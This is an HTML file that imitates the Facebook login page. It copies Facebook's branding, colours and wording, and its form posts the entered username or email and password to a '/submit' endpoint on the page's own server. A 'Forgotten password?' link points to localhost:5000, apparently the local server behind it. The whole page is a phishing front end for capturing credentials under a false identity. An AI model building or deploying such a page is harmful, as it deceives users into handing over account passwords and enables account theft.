<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      padding: 30px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .login-box h1 {
      color: #1877f2;
      font-size: 32px;
      margin-bottom: 20px;
    }

    .login-box p {
      font-size: 14px;
      margin-bottom: 30px;
      color: #606770;
    }

    label {
      font-size: 14px;
      color: #1c1e21;
      display: block;
      text-align: left;
      margin-bottom: 5px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #dddfe2;
      border-radius: 5px;
      font-size: 14px;
    }

    input[type="submit"] {
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }

    input[type="submit"]:hover {
      background-color: #165ec8;
    }

    .signup-link {
      display: block;
      margin-top: 20px;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .signup-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <h1>Facebook</h1>
      <p>Log into Facebook to connect with friends, family, and others you know.</p>
      <form action="/submit" method="post">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
        <input type="submit" value="Log In" >
      </form>
      <a href="http://localhost:5000/" class="signup-link">Forgotten password?</a>
    </div>
  </div>
</body>
</html>
